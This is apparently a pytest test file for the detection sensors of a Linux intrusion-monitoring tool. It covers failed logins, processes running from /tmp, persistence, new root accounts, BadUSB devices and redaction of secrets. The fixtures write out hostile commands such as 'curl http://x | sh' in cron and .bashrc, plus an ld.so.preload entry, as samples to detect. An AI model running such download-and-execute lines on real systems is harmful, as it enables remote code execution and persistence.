"""Blue-team sensors: each detects its attack, stays quiet about normal life, and learns before it alerts."""
from __future__ import annotations

import json
import os
import stat
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "LinuxGuardianSuite"))

import events  # noqa: E402
import sensors as sn  # noqa: E402

T0 = 1_800_000_000.0
DAY = 86400


def stub(bindir: Path, name: str, body: str) -> None:
    p = bindir / name
    p.write_text("#!/bin/sh\n" + body)
    p.chmod(p.stat().st_mode | stat.S_IEXEC)


@pytest.fixture()
def box(tmp_path, monkeypatch):
    t = tmp_path
    for d in ("proc", "home/.config/autostart", "home/.local/bin", "etc/cron.d", "usb", "bin"):
        (t / d).mkdir(parents=True, exist_ok=True)
    (t / "auth.log").write_text("Oct 12 10:00:00 h sshd[1]: Server listening\n")
    (t / "passwd").write_text("root:x:0:0:root:/root:/bin/bash\nme:x:1000:1000::/home/me:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n")
    (t / "group").write_text("sudo:x:27:me\nadmin:x:116:\n")
    (t / "ss.out").write_text("")
    stub(t / "bin", "ss", 'cat "$SS_OUT"')
    stub(t / "bin", "crontab", 'cat "$CRON_OUT" 2>/dev/null || exit 1')
    stub(t / "bin", "dpkg", 'echo "dpkg-query: no path found matching pattern $3" >&2; exit 1')
    monkeypatch.setenv("PATH", f"{t/'bin'}:{os.environ['PATH']}")
    monkeypatch.setenv("SS_OUT", str(t / "ss.out"))
    monkeypatch.setenv("CRON_OUT", str(t / "cron.out"))
    monkeypatch.setenv("LG_HOME", str(t / "lg"))
    monkeypatch.setenv("LG_PROC", str(t / "proc"))
    monkeypatch.setenv("LG_AUTH_LOG", str(t / "auth.log"))
    monkeypatch.setenv("LG_SENSOR_HOME", str(t / "home"))
    monkeypatch.setenv("LG_SENSOR_ETC", str(t / "etc"))
    monkeypatch.setenv("LG_PASSWD", str(t / "passwd"))
    monkeypatch.setenv("LG_GROUP", str(t / "group"))
    monkeypatch.setenv("LG_USB", str(t / "usb"))
    monkeypatch.setenv("LG_SENSOR_NOW", str(T0))
    (t / "approot").mkdir()
    monkeypatch.setenv("LG_APP_ROOT", str(t / "approot"))             # the app-integrity sensor watches a throwaway tree, not this checkout
    return t


def at(monkeypatch, offset: float) -> None:
    monkeypatch.setenv("LG_SENSOR_NOW", str(T0 + offset))


def baseline(box, monkeypatch) -> None:
    """The first pass learns what's normal, and we jump past the 3-day learning window."""
    sn.run_once()
    at(monkeypatch, 4 * DAY)


def sensor_events(box) -> list[dict]:
    return [e for e in events.read_events(box / "lg" / "incidents", limit=500) if e.get("category") == "sensor"]


def names(box) -> list[str]:
    return sorted(e["event"] for e in sensor_events(box))


def add_proc(box: Path, pid: int, exe: str, args: list[str], comm: str | None = None) -> None:
    d = box / "proc" / str(pid)
    d.mkdir(parents=True, exist_ok=True)
    link = d / "exe"
    if link.is_symlink() or link.exists():
        link.unlink()
    if exe:
        link.symlink_to(exe)
    (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in args) + b"\0")
    (d / "comm").write_text((comm or os.path.basename(exe.removesuffix(" (deleted)")) or "x") + "\n")


def append_auth(box: Path, *lines: str) -> None:
    with (box / "auth.log").open("a") as f:
        f.write("\n".join(lines) + "\n")


# ------------------------------------------------------------------ learning
def test_first_run_learns_and_alerts_on_nothing(box):
    append_auth(box, "Oct 12 sshd[1]: Failed password for root from 6.6.6.6 port 1 ssh2")
    r = sn.run_once()
    assert r["first_run"] and r["recorded"] == 0 and sensor_events(box) == []
    assert all(i["ok"] for i in r["sensors"].values())


def test_state_survives_between_runs_and_status_reports_learning(box, monkeypatch):
    sn.run_once()
    s = sn.status()
    assert s["active"] and s["learning"] and len(s["sensors"]) == len(sn.SENSORS)
    at(monkeypatch, 4 * DAY)
    assert not sn.status()["learning"]


# ---------------------------------------------------------------------- auth
def test_repeated_failed_logins_are_one_finding_not_many(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, *[f"Oct 12 sshd[9]: Failed password for invalid user admin{i} from 203.0.113.9 port 4{i} ssh2" for i in range(7)])
    sn.run_once()
    ev = sensor_events(box)
    assert [e["event"] for e in ev] == ["failed_logins"] and ev[0]["severity"] == "warning" and "7 failed" in ev[0]["message"]
    assert ev[0]["technique"] == "T1110" and "203.0.113.9" in ev[0]["entity"]


def test_a_success_after_failures_from_the_same_place_is_critical(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, *[f"Oct 12 sshd[9]: Failed password for me from 203.0.113.9 port {i} ssh2" for i in range(6)],
                "Oct 12 sshd[9]: Accepted password for me from 203.0.113.9 port 99 ssh2")
    sn.run_once()
    [e] = sensor_events(box)
    assert e["severity"] == "critical" and "SUCCEEDED" in e["message"]


def test_a_few_typos_are_not_an_attack(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, *[f"Oct 12 sshd[9]: Failed password for me from 192.168.1.5 port {i} ssh2" for i in range(3)])
    sn.run_once()
    assert sensor_events(box) == []


def test_the_apps_own_non_interactive_sudo_probes_are_not_failures(box, monkeypatch):
    """Real bug found on this laptop: `sudo -n -l` (our own audit) writes 'a password is required' lines."""
    baseline(box, monkeypatch)
    append_auth(box, *[l for _ in range(8) for l in (
        "Oct 12 14:44:49 h sudo: pam_unix(sudo:auth): conversation failed",
        "Oct 12 14:44:49 h sudo: pam_unix(sudo:auth): auth could not identify password for [me]",
        "Oct 12 14:44:49 h sudo:   me : a password is required ; PWD=/x ; USER=root ; COMMAND=list")])
    sn.run_once()
    assert sensor_events(box) == []


def test_wrong_sudo_password_attempts(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, "Oct 12 h sudo:       me : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls")
    sn.run_once()
    assert names(box) == ["sudo_failed"]


def test_new_account_and_admin_group_additions_from_the_log(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, "Oct 12 h useradd[5]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0",
                "Oct 12 h usermod[6]: add 'backdoor' to group 'sudo'")
    sn.run_once()
    ev = {e["event"]: e for e in sensor_events(box)}
    assert "new_user" in ev and ev["privilege_added"]["severity"] == "critical"


def test_sensitive_sudo_is_noted_ordinary_sudo_is_not(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, "Oct 12 h sudo:       me : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt update",
                "Oct 12 h sudo:       me : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash",
                "Oct 12 h sudo:       me : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/curl http://x/s.sh | sh")
    sn.run_once()
    assert names(box) == ["sudo_sensitive", "sudo_sensitive"]


def test_only_new_log_lines_are_read_each_time(box, monkeypatch):
    baseline(box, monkeypatch)
    append_auth(box, *[f"Oct 12 sshd[9]: Failed password for x from 203.0.113.9 port {i} ssh2" for i in range(6)])
    sn.run_once()
    at(monkeypatch, 4 * DAY + 600)
    sn.run_once()                                                   # nothing new in the log: nothing new said
    assert names(box) == ["failed_logins"]


def test_a_rotated_log_is_read_from_the_start(box, monkeypatch):
    baseline(box, monkeypatch)
    (box / "auth.log").unlink()
    (box / "auth.log").write_text("\n".join(f"Oct 13 sshd[9]: Failed password for x from 198.51.100.2 port {i} ssh2" for i in range(6)) + "\n")
    sn.run_once()
    assert names(box) == ["failed_logins"]


def test_unreadable_auth_log_is_reported_not_crashed(box):
    (box / "auth.log").unlink()
    r = sn.run_once()
    assert not r["sensors"]["auth"]["ok"] and "adm" in r["sensors"]["auth"]["error"]
    assert r["sensors"]["processes"]["ok"]                          # other sensors still ran


# ------------------------------------------------------------------ processes
def test_program_running_from_tmp(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 4242, "/tmp/.x/payload", ["/tmp/.x/payload", "--token=abc123secret", "-c", "evil"])
    sn.run_once()
    [e] = sensor_events(box)
    assert e["event"] == "proc_from_tmp" and e["severity"] == "warning" and e["exe"] == "/tmp/.x/payload" and e["technique"] == "T1036.005"
    assert "abc123secret" not in json.dumps(e) and "[redacted]" in e["cmd"]


def test_appimage_mounts_and_allowed_paths_are_normal(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 10, "/tmp/.mount_CursorAbc/usr/bin/cursor", ["cursor"])
    add_proc(box, 11, "/tmp/mytool", ["/tmp/mytool"])
    (box / "lg" / "sensors_allow.json").write_text(json.dumps({"exe": ["/tmp/mytool"]}))
    sn.run_once()
    assert sensor_events(box) == []


def test_deleted_program_is_flagged_only_outside_system_paths(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 20, "/usr/lib/firefox/firefox (deleted)", ["firefox"])         # normal: an update replaced it
    add_proc(box, 21, "/home/me/.hidden/miner (deleted)", ["/home/me/.hidden/miner"])
    sn.run_once()
    assert names(box) == ["proc_deleted_exe"] and sensor_events(box)[0]["exe"] == "/home/me/.hidden/miner"


def test_a_real_kernel_thread_is_fine_but_an_imposter_is_critical(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 2, "", ["[kthreadd]"], comm="kthreadd")
    add_proc(box, 66, "/home/me/.cache/x/evil", ["[kworker/0:1]"], comm="kworker/0:1")
    sn.run_once()
    [e] = sensor_events(box)
    assert e["event"] == "proc_masquerade" and e["severity"] == "critical"


def test_the_same_process_is_not_announced_every_five_minutes(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 5, "/tmp/p", ["/tmp/p"])
    for i in range(5):
        at(monkeypatch, 4 * DAY + i * 300)
        sn.run_once()
    assert names(box) == ["proc_from_tmp"]
    at(monkeypatch, 4 * DAY + 2 * DAY)                             # still running two days later: remind once
    sn.run_once()
    assert names(box).count("proc_from_tmp") == 2


def test_a_python_script_is_identified_by_the_script_not_the_interpreter(box):
    p = {"exe": "/usr/bin/python3.10", "args": ["python3", "-u", "/tmp/evil.py"], "comm": "python3", "pid": 1, "uid": 1}
    assert sn.script_of(p) == "/tmp/evil.py"
    assert sn.script_of({"exe": "/usr/bin/curl", "args": ["curl", "x"], "comm": "curl", "pid": 1, "uid": 1}) == ""


# -------------------------------------------------------------------- network
def ss_line(comm, pid, ip, port) -> str:
    return f'0 0 10.0.0.5:5555 {ip}:{port} users:(("{comm}",pid={pid},fd=3))\n'


def test_network_is_quiet_while_learning_then_alerts_on_a_new_program(box, monkeypatch):
    add_proc(box, 77, "/usr/bin/firefox", ["firefox"])
    (box / "ss.out").write_text(ss_line("firefox", 77, "93.184.216.34", 443))
    sn.run_once()                                                   # learns firefox
    add_proc(box, 88, "/home/me/.local/bin/newtool", ["newtool"])
    (box / "ss.out").write_text(ss_line("firefox", 77, "93.184.216.34", 443) + ss_line("newtool", 88, "8.8.4.4", 443))
    at(monkeypatch, 3600)
    sn.run_once()
    assert sensor_events(box) == []                                 # still learning: recorded, not announced
    (box / "ss.out").write_text(ss_line("firefox", 77, "93.184.216.34", 443) + ss_line("brandnew", 99, "8.8.8.8", 443))
    add_proc(box, 99, "/opt/brandnew/brandnew", ["brandnew"])
    at(monkeypatch, 4 * DAY)
    sn.run_once()
    [e] = sensor_events(box)
    assert e["event"] == "new_outbound_program" and e["severity"] == "info" and "8.8.8.8" in e["message"]


def test_a_new_program_from_an_unusual_place_is_a_warning(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 5, "/tmp/dropper", ["/tmp/dropper"])
    (box / "ss.out").write_text(ss_line("dropper", 5, "9.9.9.9", 443))
    sn.run_once()
    ev = {e["event"]: e for e in sensor_events(box)}
    assert ev["new_outbound_program"]["severity"] == "warning" and "unusual place" in ev["new_outbound_program"]["message"]
    assert "proc_from_tmp" in ev                                    # and the process sensor caught it independently


def test_suspicious_port_by_a_known_program(box, monkeypatch):
    add_proc(box, 7, "/usr/bin/curl", ["curl"])
    (box / "ss.out").write_text(ss_line("curl", 7, "1.0.0.1", 443))
    sn.run_once()
    at(monkeypatch, 4 * DAY)
    (box / "ss.out").write_text(ss_line("curl", 7, "1.0.0.1", 4444))
    sn.run_once()
    [e] = sensor_events(box)
    assert e["event"] == "suspicious_port" and e["severity"] == "warning" and "Metasploit" in e["message"] and e["port"] == 4444


def test_local_and_private_destinations_are_ignored(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 5, "/opt/x/x", ["x"])
    (box / "ss.out").write_text(ss_line("x", 5, "192.168.1.9", 8000) + ss_line("x", 5, "127.0.0.1", 9) + ss_line("x", 5, "100.67.1.2", 22))
    sn.run_once()
    assert sensor_events(box) == []


def test_parse_ss():
    rows = sn.parse_ss(ss_line("firefox", 1, "1.2.3.4", 443) + "garbage line\n")
    assert rows == [{"ip": "1.2.3.4", "port": 443, "comm": "firefox", "pid": 1}]


# ------------------------------------------------------------------- autoruns
def test_new_autostart_cron_and_service_are_persistence(box, monkeypatch):
    baseline(box, monkeypatch)
    (box / "home/.config/autostart/updater.desktop").write_text("[Desktop Entry]\nExec=/tmp/x\n")
    (box / "etc/cron.d/job").write_text("* * * * * root /tmp/x\n")
    (box / "cron.out").write_text("*/5 * * * * curl http://x | sh\n")
    sn.run_once()
    ev = sensor_events(box)
    assert names(box) == ["new_autostart"] * 3 and all(e["severity"] == "warning" and e["stage"] == "persistence" for e in ev)
    assert {e["technique"] for e in ev} == {"T1547.013", "T1053.003"}


def test_a_package_owned_new_file_is_only_information(box, monkeypatch):
    stub(box / "bin", "dpkg", 'echo "cron: $3"')
    baseline(box, monkeypatch)
    (box / "etc/cron.d/apt-thing").write_text("0 * * * * root true\n")
    sn.run_once()
    [e] = sensor_events(box)
    assert e["severity"] == "info" and "installed by the package cron" in e["message"]


def test_shell_startup_modification_is_flagged_and_ld_preload_is_critical(box, monkeypatch):
    (box / "home/.bashrc").write_text("export A=1\n")
    baseline(box, monkeypatch)
    (box / "home/.bashrc").write_text("export A=1\ncurl http://x | sh\n")
    (box / "etc/ld.so.preload").write_text("/tmp/evil.so\n")
    sn.run_once()
    ev = {e["event"]: e for e in sensor_events(box)}
    assert ev["autostart_changed"]["severity"] == "warning"
    assert [e for e in sensor_events(box) if "preload" in e["message"]][0]["severity"] == "critical"


def test_unchanged_files_are_silent(box, monkeypatch):
    (box / "home/.bashrc").write_text("x\n")
    baseline(box, monkeypatch)
    sn.run_once()
    assert sensor_events(box) == []


# ------------------------------------------------------------------- accounts
def test_new_uid0_account_is_critical(box, monkeypatch):
    baseline(box, monkeypatch)
    with (box / "passwd").open("a") as f:
        f.write("toor:x:0:0::/root:/bin/bash\nnormal:x:1001:1001::/home/normal:/bin/bash\n")
    sn.run_once()
    ev = {e["user"]: e for e in sensor_events(box)}
    assert ev["toor"]["severity"] == "critical" and ev["normal"]["severity"] == "warning"


def test_admin_group_membership_change(box, monkeypatch):
    baseline(box, monkeypatch)
    (box / "group").write_text("sudo:x:27:me,mallory\nadmin:x:116:\n")
    sn.run_once()
    [e] = sensor_events(box)
    assert e["event"] == "privilege_added" and e["severity"] == "critical" and e["user"] == "mallory"


def test_a_system_account_gaining_a_login_shell(box, monkeypatch):
    baseline(box, monkeypatch)
    (box / "passwd").write_text((box / "passwd").read_text().replace("/usr/sbin/nologin", "/bin/bash"))
    sn.run_once()
    assert names(box) == ["shell_enabled"]


# ------------------------------------------------------------------------ usb
def add_usb(box: Path, name: str, vid: str, pid: str, classes: list[str], product="Gadget") -> None:
    d = box / "usb" / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "idVendor").write_text(vid + "\n")
    (d / "idProduct").write_text(pid + "\n")
    (d / "product").write_text(product + "\n")
    for i, c in enumerate(classes):
        (box / "usb" / f"{name}:1.{i}").mkdir(exist_ok=True)
        (box / "usb" / f"{name}:1.{i}" / "bInterfaceClass").write_text(c + "\n")
        (d / f"{name}:1.{i}").mkdir(exist_ok=True)
        (d / f"{name}:1.{i}" / "bInterfaceClass").write_text(c + "\n")


def test_new_usb_device_and_the_badusb_combination(box, monkeypatch):
    baseline(box, monkeypatch)
    add_usb(box, "1-1", "046d", "c52b", ["03"], "Mouse")
    add_usb(box, "1-2", "dead", "beef", ["03", "08"], "Totally A Flash Drive")
    sn.run_once()
    ev = {e["device"]: e for e in sensor_events(box)}
    assert ev["Mouse"]["severity"] == "info" and ev["Totally A Flash Drive"]["severity"] == "warning" and "BadUSB" in ev["Totally A Flash Drive"]["message"]


# ------------------------------------------------------------------- commands
def test_new_local_command_and_dropped_tmp_executable(box, monkeypatch):
    baseline(box, monkeypatch)
    f = box / "home/.local/bin/helper"
    f.write_text("#!/bin/sh\n")
    f.chmod(0o755)
    sn.run_once()
    ev = sensor_events(box)
    assert names(box) == ["new_local_command"] and ev[0]["severity"] == "info" and ev[0]["technique"] == "T1195"


# -------------------------------------------------------------------- engine
def test_every_event_carries_what_incidents_need(box, monkeypatch):
    baseline(box, monkeypatch)
    add_proc(box, 4, "/tmp/p", ["/tmp/p"])
    sn.run_once()
    [e] = sensor_events(box)
    for field in ("entity", "technique", "stage", "key", "sensor", "severity", "message"):
        assert e.get(field), field


def test_a_crashing_sensor_does_not_silence_the_rest(box, monkeypatch):
    monkeypatch.setitem(sn.SENSORS, "processes", lambda ctx: 1 / 0)
    baseline(box, monkeypatch)
    append_auth(box, *[f"Oct 12 sshd[9]: Failed password for x from 203.0.113.9 port {i} ssh2" for i in range(6)])
    r = sn.run_once()
    assert not r["sensors"]["processes"]["ok"] and "ZeroDivisionError" in r["sensors"]["processes"]["error"]
    assert names(box) == ["failed_logins"]


def test_redaction():
    assert "hunter2" not in sn.redact_args("tool --password hunter2 --user bob")
    assert "xyz" not in sn.redact_args("curl -H 'Authorization: Bearer xyz' http://a")
    assert "tok123" not in sn.redact_args("run --api-key tok123 --x 1") and "--x 1" in sn.redact_args("run --api-key tok123 --x 1")
    assert "s3cret" not in sn.redact_args("git clone https://bob:s3cret@host/x.git")
    assert sn.redact_args("ls -la /home") == "ls -la /home"


def test_cli_run_and_status(box):
    import subprocess
    env = dict(os.environ)
    out = subprocess.run([sys.executable, str(ROOT / "LinuxGuardianSuite" / "sensors.py"), "--run"], capture_output=True, text=True, env=env)
    assert out.returncode == 0 and "10 of 10 working" in out.stdout
    st = json.loads(subprocess.run([sys.executable, str(ROOT / "LinuxGuardianSuite" / "sensors.py"), "--status", "--json"], capture_output=True, text=True, env=env).stdout)
    assert st["active"] and len(st["sensors"]) == 10


def test_expected_programs_can_be_allowed_and_broad_paths_cannot(box, monkeypatch):
    assert sn.allow_path_entry("/tmp/mytool") and sn.allow_path_entry("/opt/vendor/")
    for bad in ("/", "/tmp/", "/tmp", "/usr/", "relative/x", "/tmp/*", "", "/a\nb"):
        assert not sn.allow_path_entry(bad), bad
    baseline(box, monkeypatch)
    add_proc(box, 9, "/tmp/mytool", ["/tmp/mytool"])
    sn.run_once()
    assert sensor_events(box) == []                                 # allowed: no alert


def test_allow_cli(box):
    import subprocess
    ok = subprocess.run([sys.executable, str(ROOT / "LinuxGuardianSuite" / "sensors.py"), "--allow", "/opt/x/tool"], capture_output=True, text=True, env=os.environ)
    bad = subprocess.run([sys.executable, str(ROOT / "LinuxGuardianSuite" / "sensors.py"), "--allow", "/tmp/"], capture_output=True, text=True, env=os.environ)
    assert ok.returncode == 0 and bad.returncode == 1
    assert "/opt/x/tool" in json.loads((box / "lg" / "sensors_allow.json").read_text())["exe"]


def test_status_reports_whether_the_timer_is_actually_installed(box, monkeypatch):
    stub(box / "bin", "systemctl", 'echo enabled')
    assert sn.status()["timer"] is True
    stub(box / "bin", "systemctl", 'echo disabled; exit 1')
    assert sn.status()["timer"] is False


# ------------------------------------------------------- executables dropped in scratch folders
def drop(path: Path, content: bytes, mode: int = 0o755, mtime: float | None = None) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content)
    os.chmod(path, mode)
    if mtime is not None:
        os.utime(path, (mtime, mtime))


def test_executable_dropped_in_a_scratch_folder_is_flagged_only_when_new_and_really_a_program(box, monkeypatch):
    scratch = box / "scratch"
    scratch.mkdir()
    monkeypatch.setattr(sn, "TMP_DIRS", (str(scratch) + "/",))
    drop(scratch / "old-installer", b"\x7fELF\x02\x01", mtime=T0 - 3600)                      # existed before the first look
    sn.run_once()
    at(monkeypatch, 4 * DAY)
    drop(scratch / "dropper", b"\x7fELF\x02\x01\x01", mtime=T0 + 4 * DAY)                      # new ELF with exec bit
    drop(scratch / "notes.txt", b"hello", mode=0o755, mtime=T0 + 4 * DAY)                      # executable bit but not a program
    drop(scratch / "data.bin", b"\x7fELF\x02\x01", mode=0o644, mtime=T0 + 4 * DAY)             # ELF but not executable
    drop(scratch / ".mount_AppX" / "usr" / "bin" / "app", b"\x7fELF", mtime=T0 + 4 * DAY)      # AppImage mount: normal
    sn.run_once()
    ev = sensor_events(box)
    assert [e["event"] for e in ev] == ["exe_dropped_in_tmp"] and ev[0]["path"].endswith("/dropper") and len(ev[0]["sha256"]) == 16
    assert ev[0]["technique"] == "T1105" and ev[0]["severity"] == "warning"


def test_the_same_dropped_file_is_not_reported_twice(box, monkeypatch):
    scratch = box / "scratch"
    scratch.mkdir()
    monkeypatch.setattr(sn, "TMP_DIRS", (str(scratch) + "/",))
    sn.run_once()
    drop(scratch / "dropper", b"\x7fELF\x02", mtime=T0 + 100)
    for i in range(3):
        at(monkeypatch, 200 + i * 300)
        sn.run_once()
        drop(scratch / "dropper", b"\x7fELF\x02", mtime=T0 + 200 + i * 300)               # rewritten each pass
    assert names(box).count("exe_dropped_in_tmp") == 1
